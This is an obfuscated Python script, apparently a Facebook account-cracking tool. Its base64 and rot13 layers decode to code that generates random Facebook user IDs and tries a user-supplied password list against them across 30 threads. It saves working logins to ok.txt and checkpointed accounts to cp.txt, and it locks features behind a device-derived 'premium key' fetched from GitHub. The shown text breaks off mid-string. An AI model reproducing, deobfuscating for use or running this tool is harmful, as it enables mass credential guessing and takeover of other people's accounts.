# Python code obfuscated by www.development-tools.net 
 

import base64, codecs
magic = 'IyByZXZlcnNlIHB1dC5weSANCiMgZmlsZSBuYW1lIHdvdy5jcHl0aG9uLTMxMC5zbw0KDQpXID0gJ1wwMzNbOTc7MW0nIA0KUiA9ICdcMDMzWzkxOzFtJyANCkcgPSAnXDAzM1s5MjsxbScgDQpZID0gJ1wwMzNbOTM7MW0nIA0KQiA9ICdcMDMzWzk0OzFtJw0KUCA9ICdcMDMzWzk1OzFtJw0KQyA9ICdcMDMzWzk2OzFtJw0KTiA9ICdceDFiWzBtJw0KDQoNCg0KaW1wb3J0IG9zDQp0cnk6DQoJaW1wb3J0IHJlcXVlc3RzDQpleGNlcHQgSW1wb3J0RXJyb3I6DQoJb3Muc3lzdGVtKCJwaXAgaW5zdGFsbCByZXF1ZXN0cyIpDQoNCnRyeToNCglpbXBvcnQgY29uY3VycmVudC5mdXR1cmVzDQpleGNlcHQgSW1wb3J0RXJyb3I6DQoJb3Muc3lzdGVtKCJwaXAgaW5zdGFsbCBmdXR1cmVzIikNCg0KaW1wb3J0IG9zDQppbXBvcnQgc3lzDQppbXBvcnQgdGltZQ0KaW1wb3J0IHJlcXVlc3RzDQppbXBvcnQgcmFuZG9tDQppbXBvcnQgcGxhdGZvcm0NCmltcG9ydCBiYXNlNjQNCmltcG9ydCBzdWJwcm9jZXNzDQpmcm9tIGNvbmN1cnJlbnQuZnV0dXJlcyBpbXBvcnQgVGhyZWFkUG9vbEV4ZWN1dG9yDQoNCg0KZGVmIHJ1bnR4dCh6KToNCiAgICBmb3IgZSBpbiB6ICsgIlxuIjoNCiAgICAgICAgc3lzLnN0ZG91dC53cml0ZShlKQ0KICAgICAgICBzeXMuc3Rkb3V0LmZsdXNoKCkNCiAgICAgICAgdGltZS5zbGVlcCgwLjAzKQ0KDQoNCg0KZGVmIGhlbHBub3RlKCk6DQoJcHJpbnQoIiVzIFsqXSBGT0xMT1cgTUUgT04gRmIgVFUgS05PVyBBQk9VVCBVUERBVEVTICA6KSIlKEcpKQ0KCXN1YnByb2Nlc3MuY2hlY2tfb3V0cHV0KFsiYW0iLCAic3RhcnQiLCAiaHR0cHM6Ly9naXRodWIuY29tL2lyZmFuNzczMi90ZXN0L2Jsb2IvbWFpbi9hLnR4dCJdKQ0KCWV4aXQoIiBbKl0gRkFDRUJPT0sgOiAgaHR0cHM6Ly93d3cuZmFjZWJvb2suY29tL2lyZmFuLjc3MzIiKQ0KDQoNCmRlZiBub3RpY2UoKToNCg0KIA0KDQoJcnVudHh0KCJcblwwMzNbMDs5MW1ZT1UgQVJFIE5PVCBQUkVNSVVNIFVTRVIgIikNCglydW50eHQoIlwwMzNbMDs5M20gIFNFTlQgVEhJUyBLRVkgVE8gQURNSU4gPj4gJXMlcyIlKEcsYmFzZXNwbGl0KSkNCglydW50eHQoIlwwMzNbMDs5Mm0gQURNSU4gTUVTU0VOR0VS8J+UsFJSLVJJWUFEIikNCglzdWJwcm9jZXNzLmNoZWNrX291dHB1dChbImFtIiwgInN0YXJ0IiwgImh0dHBzOi8vbS5tZS9hYnVib2Nrb3IucmlhZC43Il0pDQoNCmRlZiBpcmZhbigpOg0KCQ0KCQ0KCXJ1bnR4dCgiXG5cMDMzWzA7OTFtIFRoaXMgdG9vbCBpcyBVbmRlciBtYWludGVuYW5jZSBicmVhayAiKQ0KCXJ1bnR4dCgiXG5cMDMzWzA7OTFtIFNvIHdhaXQgRm9yIFVwZGF0ZSAiKQ0KICAgICAgICANCgkNCgkNCnBsaXN0ID0gKHBsYXRmb3JtLnVuYW1lKCkpWzJdDQpiYXNleCA9IHBsaXN0DQpiYXNleDEgPSBiYXNleC5lbmNvZGUoJ2FzY2lpJykNCmJhc2V4MiA9IGJhc2U2NC5iNjRlbmNvZGUoYmFzZXgxKQ0KYmFzZXgzID0gYmFzZXgyLmRlY29kZSgnYXNjaWknKQ0KYmFzZTQgPSAoYmFzZXgzKS51cHBlcigpDQpiYXNlc3BsaXQgPSBiYXNlNC5yZXBsYWNlKCc9JywgJ1gnKS5yZXBsYWNlKCdBJywgJzMnKS5yZXBsYWNlKCdCJywgJzknKS5yZXBsYWNlKCdDJywgJzcnKS5yZXBsYWNlKCdEJywgJzEnKS5yZXBsYWNlKCdFJywgJzQnKS5yZXBsYWNlKCdNJywgJzInKS5yZXBsYWNlKCdMJywgJzYnKS5yZXBsYWNlKCdGJywgJzgnKS5yZXBsYWNlKCdOJywgJ0UnKS5yZXBsYWNlKCdUJywgJzgnKQ0KDQoNCmNsYXNzIE1haW46DQoJZGVmIF9faW5pdF9fKHNlbGYpOg0KCQlzZWxmLmlkID0gW10NCgkJc2VsZi5vayA9IFtdDQoJCXNlbGYuY3AgPSBbXQ0KCQlzZWxmLmxvb3AgPSAwDQoJCXRyeToNCgkJCXBsciA9IHJlcXVlc3RzLmdldCgnaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL1JpeWFkLVJSLUhhY2tlci90ZXh0L21haW4vRGlzJykudGV4dA0KCQkJaWYgYmFzZXNwbGl0IGluIHBscjoNCgkJCQlrZXkgPSBiYXNlc3BsaXQNCgkJCQlzdGF0ID0gKCJcMDMzWzA7OTJtUFJFTUlVTSIpDQoJCQkJRlkgPSAnXDAzM1swOzkzbScNCgkJCQlGRyA9ICdcMDMzWzA7OTJtJw0KCQkJCUdFVCA9ICdccicNCgkJCWVsc2U6DQoJCQkJa2V5ID0gKCJcMDMzWzA7OTFtIC0iKQ0KCQkJCXN0YXQgPSAoIlwwMzNbMDs5MW1GUkVFIFVTRVIiKQ0KCQkJCUZZID0gJ1wwMzNbMDs5MG0nDQoJCQkJRkcgPSAnXDAzM1swOzkwbScNCgkJCQlHRVQgPSAnXDAzM1swOzkybSBbUF0gR0VUIFBSRU1JVU0nDQoJCWV4Y2VwdCByZXF1ZXN0cy5leGNlcHRpb25zLkNvbm5lY3Rpb25FcnJvcjoNCgkJCXByaW50KCJcbiVzIFshXSBOTyBJTlRFUk5FVCBDT05ORUNUSU9OLi5cbiIlKEcpKQ0KCQkJZXhpdCgpDQoJCW9zLnN5c3RlbSgiY2xlYXIiKQ0KCQkNCgkJcHJpbnQgKCIiIlwwMzNbMTs5Mm0gICAgICAgICAgICAgICAgICAgICAgIA0KXDAzM1sxOzkwbeKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkA0KXDAzM1sxOzkxbSBbXDAzM1sxOzk0beKck1wwMzNbMTs5MW1dIFwwMzNbMTs5Mm1GQUNFQk9PSyA6IEFMVklOIEdBTloNClwwMzNbMTs5MW0gW1wwMzNbMTs5NG3inJNcMDMzWzE7OTFtXSBcMDMzWzE7OTJtRkIgR1JPVVAgOiBCQU5EQVIgQk9LRUINClwwMzNbMTs5MW0gW1wwMzNbMTs5NG3inJNcMDMzWzE7OTFtXSBcMDMzWzE7OTJtR0lUSFVCICAgOiBQUklWQVQgRFVMVQ0KXDAzM1sxOzkxbSBbXDAzM1sxOzk0beKck1wwMzNbMTs5MW1dIFwwMzNbMTs5Mm1XQVJOSU5HICA6IEhBVEVSUyBTRU1BS0lOIERJIERFUEFODQpcMDMzWzE7OTBt4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQDQogICAgIiIiKQ0KCQlwcmludCgiJXMgWyVz4oCiJXNdICVzVE9PTCBOQU1FIDogJXNTdXBlciBTcGVlZCBVaWQgQ2xvbmluZyIlKEcsUixHLEIsRykpDQoJCXByaW50KCIlcyBbJXPigKIlc10gJXNWRVJTSU9OICAgOiAlczIuMCIlKEcsUixHLEIsRykpDQoJCXByaW50KCIlcyBbJXPigKIlc10gJXNZT1VSIEtFWSAgOiAlcyVzIiUoRyxSLEcsQixHLGtleSkpDQoJCXByaW50KCIlcyBbJXPigKIlc10gJXNTVEFUVVMgICAgOiAlcyIlKEcsUixHLEIsc3RhdCkpIA0KCQlwcmludCgiIikNCgkJcHJpbnQoIiVzIFslczAxJXNdJXMgQ1JBQ0sgUkFORE9NIEZCIElEIDIwMDktMTEgJXMoUFJPKSBWMVtIaWdoIFNwZWVkXSIlKFIsRyxSLFksRykpDQoJCXByaW50KCIlcyBbJXMwMiVzXSVzIENSQUNLIFJBTkRPTSBGQiBJRCAyMDA1LTggJXMgKFBSTykgVjJbSGlnaCBTcGVlZF0iJShSLEcsUixZLEcpKQ0KCQlwcmludCgiJXMgWyVzMDMlc10lcyBDUkFDSyBSQU5ET00gRkIgSUQgMjAwNC01ICVzIChQUk8pIFYzW1N1cGVyIFNsb3ddIiUoUixHLFIsWSxHKSkNCgkJcHJpbnQoIiVzIFslczA0JXNdJXMgQ1JBQ0sgRlJPTSBFTUFJTFMgJXMoUFJPKSBbTm9ybWFsXSIlKFIsRyxSLFksRykpDQoJCXByaW50KEdFVCkNCgkJaG9nYSA9IGlucHV0KCJcbiVzIFs/XSBDSE9JQ0UgOiAiJShCKSkNCgkJaWYgaG9nYSBpbiBbIiIsICIgIl06DQoJCQlNYWluKCkNCgkJZWxpZiBob2dhIGluIFsiIiwgIjAiXToNCgkJCWlmIGJhc2VzcGxpdCBpbiBwbHI6DQoJCQkJc2VsZi5vbGRjcmFjaygpDQoJCQllbHNlOiANCgkJCQlub3RpY2UoKQ0KCQkJCWV4aXQoKQ0KCQllbGlmIGhvZ2EgaW4gWyIxIiwgIjAxIl06DQoJCQlpZiBiYXNlc3BsaXQgaW4gcGxyOg0KCQkJICAgIHNlbGYuZmJ0dWEoKQ0KCQkJZWxzZTogDQoJCQkJbm90aWNlKCkNCgkJCQlleGl0KCkNCgkJZWxpZiBob2dhIGluIFsiMiIsICIwMiJdOg0KCQkJaWYgYmFzZXNwbGl0IGluIHBscjoNCgkJCSAgICBzZWxmLmZidHVhKCkNCgkJCWVsc2U6IA0KCQkJCW5vdGljZSgpDQoJCQkJZXhpdCgpDQoJCWVsaWYgaG9nYSBpbiBbIjMiLCAiMDMiXToNCgkJCWlmIGJhc2VzcGxpdCBpbiBwbHI6DQoJCQkJc2VsZi5vbGQ0XzUoKQ0KCQkJZWxzZTogDQoJCQkJbm90aWNlKCkNCgkJCQlleGl0KCkNCgkJZWxpZiBob2dhIGluIFsiNCIsICIwNCJdOg0KCQkJaWYgYmFzZXNwbGl0IGluIHBscjoNCgkJCQlzZWxmLmVtYWlsKCkNCgkJCWVsc2U6IA0KCQkJCW5vdGljZSgpDQoJCQkJZXhpdCgpDQoJCWVsaWYgaG9nYSBpbiBbIlAiLCAicCJdOg0KCQkJbm90aWNlKCkNCgkJCWV4aXQoKQ0KCQllbHNlOg0KCQkJTWFpbigpDQoNCglkZWYgb2xkY3JhY2soc2VsZik6DQoJCXggPSAxMTExMTExMQ0KCQl4eCA9IDk5OTk5OTk5DQoJCWlkeCA9ICIgMTAwMDAwMCINCgkJaWR4ID0gcmFuZG9tLmNob2ljZShbIjEiLCAiMiIsICIzIiwgIjQiLCAiNSIsICI2IiwgIjciLCAiOCIsICI5Il0pDQoJCWxpbWl0ID0gaW50KGlucHV0KCJcMDMzWzA7OTJtIFsrXSBFTlRFUiBMSU1JVCBcMDMzWzA7OTFtKDUwMDAwIE1BWCk6IFwwMzNbMDs5Mm0iKSkNCgkJaWYgKGxpbWl0KT41MDAwMDoNCgkJ'
love = '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'
god = 'RXhjZXB0aW9uIGFzIGU6ZXhpdChzdHIoZSkpDQoNCglkZWYgb2xkY3JhY2soc2VsZik6DQoJCXggPSAxMTExMTExMQ0KCQl4eCA9IDk5OTk5OTk5DQoJCWlkeCA9ICIgMTAwMDAwMCINCgkJaWR4ID0gcmFuZG9tLmNob2ljZShbIjEiLCAiMiIsICIzIiwgIjQiLCAiNSIsICI2IiwgIjciLCAiOCIsICI5Il0pDQoJCWxpbWl0ID0gaW50KGlucHV0KCJcMDMzWzA7OTJtIFsrXSBFTlRFUiBMSU1JVCBcMDMzWzA7OTFtKDUwMDAwIE1BWCk6IFwwMzNbMDs5Mm0iKSkNCgkJaWYgKGxpbWl0KT41MDAwMDoNCgkJCWV4aXQoIlxuJXMgWyFdIERPTidUIENST1NTIFRIRSBMSU1JVCBCUk8gOikiJShSKSkNCgkJdHJ5Og0KCQkJZm9yIG4gaW4gcmFuZ2UobGltaXQpOg0KCQkJCV8gPSByYW5kb20ucmFuZGludCh4LHh4KQ0KCQkJCV9fID0gaWR4DQoJCQkJc2VsZi5pZC5hcHBlbmQoX18rc3RyKF8pKQ0KCQkJcHJpbnQoIlwwMzNbMDs5M20gWytdIFRPVEFMIElEIC0+IFwwMzNbMDs5MW0lc1wwMzNbMDs5N20iJShsZW4oc2VsZi5pZCkpKSANCgkJCXdpdGggVGhyZWFkUG9vbEV4ZWN1dG9yKG1heF93b3JrZXJzPTMwKSBhcyBjb2VnOg0KCQkJCXByaW50KCJcbiVzIFshXSBVU0UgJXMsICVzKENPTU1BKSVzIEZPUiBTRVBBUkFUT1IgIiUoWSxHLEIsWSkpDQoJCQkJcHJpbnQoIiVzIEVYQU1QTEUgOiAlczEyMzQ1NiwxMjM0NTY3LDEyMzQ1Njc4OSIlKFksRykpDQoJCQkJbGlzdHBhc3MgPSBpbnB1dCgiJXMgWz9dIEVOVEVSIFBBU1NXT1JEIDolcyAiJShZLEcpKQ0KCQkJCWlmIGxlbihsaXN0cGFzcyk8PTU6DQoJCQkJCWV4aXQoIlxuJXMgWyFdIFBBU1NXT1JEIE1JTklNVU0gNiBDSEFSQUNURVJTIiUoUikpDQoJCQkJcHJpbnQoIiVzIFsqXSBDUkFDSyBXSVRIIFBBU1NXT1JEIC0+IFtcMDMzWzA7OTFtJXNcMDMzWzA7OTNtXSIlKFksbGlzdHBhc3MpKQ0KCQkJCXByaW50KCJcbiVzIFsrXSBPSyBSRVNVTFRTIFNBVkVEIElOIC0+IG9rLnR4dCIlKEcpKQ0KCQkJCXByaW50KCIlcyBbK10gQ1AgUkVTVUxUUyBTQVZFRCBJTiAtPiBjcC50eHQiJShZKSkNCgkJCQlwcmludCgiJXMgWyFdIEFLVElGS0FOIE1PREUgUEVTQVdBVCBTRUxBTUEgNSBERVRJSyEhXHgxYlswbVxuIiUoUikpDQoJCQkJZm9yIHVzZXIgaW4gc2VsZi5pZDoNCgkJCQkJY29lZy5zdWJtaXQoc2VsZi5hcGksIHVzZXIsIGxpc3RwYXNzLnNwbGl0KCIsIikpDQoJCQlleGl0KCJcblxuJXMgWyNdIENSQUNLIFNFTEVTQUkuLi4iJShHKSkNCgkJZXhjZXB0IEV4Y2VwdGlvbiBhcyBlOmV4aXQoc3RyKGUpKQ0KDQoNCglkZWYgb2xkNF82KHNlbGYpOg0KCQl4ID0gMTExMTExMQ0KCQl4eCA9IDk5OTk5OTkNCgkJI2lkeCA9IGlucHV0KCIlcyBbK10gRU5URVIgQSBESUdJVCAoMS05KTogJXMiJShZLEcpKQ0KCQlpZHggPSByYW5kb20uY2hvaWNlKFsiMSIsICIyIiwgIjMiLCAiNCIsICI1IiwgIjYiLCAiNyIsICI4IiwgIjkiXSkNCgkJbGltaXQgPSBpbnQoaW5wdXQoIlwwMzNbMDs5Mm0gWytdIEVOVEVSIExJTUlUIFwwMzNbMDs5MW0oMTAwMDAgTUFYKTogXDAzM1swOzkybSIpKQ0KCQlpZiAobGltaXQpPjEwMDAwOg0KCQkJZXhpdCgiXG4lcyBbIV0gRE9OJ1QgQ1JPU1MgVEhFIExJTUlUIEJSTyA6KSIlKFIpKQ0KCQl0cnk6DQoJCQlmb3IgbiBpbiByYW5nZShsaW1pdCk6DQoJCQkJXyA9IHJhbmRvbS5yYW5kaW50KHgseHgpDQoJCQkJX18gPSBpZHgNCgkJCQlzZWxmLmlkLmFwcGVuZChfXytzdHIoXykpDQoJCQlwcmludCgiXDAzM1swOzkzbSBbK10gVE9UQUwgSUQgLT4gXDAzM1swOzkxbSVzXDAzM1swOzk3bSIlKGxlbihzZWxmLmlkKSkpIA0KCQkJd2l0aCBUaHJlYWRQb29sRXhlY3V0b3IobWF4X3dvcmtlcnM9MzApIGFzIGNvZWc6DQoJCQkJcHJpbnQoIlxuJXMgWyFdIFVTRSAlcywgJXMoQ09NTUEpJXMgRk9SIFNFUEFSQVRPUiAiJShZLEcsQixZKSkNCgkJCQlwcmludCgiJXMgRVhBTVBMRSA6ICVzMTIzNDU2LDEyMzQ1NjcsMTIzNDU2Nzg5IiUoWSxHKSkgDQoJCQkJbGlzdHBhc3MgPSBpbnB1dCgiJXMgWz9dIEVOVEVSIFBBU1NXT1JEIDolcyAiJShZLEcpKQ0KCQkJCWlmIGxlbihsaXN0cGFzcyk8PTU6DQoJCQkJCWV4aXQoIlxuJXMgWyFdIFBBU1NXT1JEIE1JTklNVU0gNiBDSEFSQUNURVJTIiUoUikpDQoJCQkJcHJpbnQoIiVzIFsqXSBDUkFDSyBXSVRIIFBBU1NXT1JEIC0+IFtcMDMzWzA7OTFtJXNcMDMzWzA7OTNtXSIlKFksbGlzdHBhc3MpKQ0KCQkJCXByaW50KCJcbiVzIFsrXSBPSyBSRVNVTFRTIFNBVkVEIElOIC0+IG9rLnR4dCIlKEcpKQ0KCQkJCXByaW50KCIlcyBbK10gQ1AgUkVTVUxUUyBT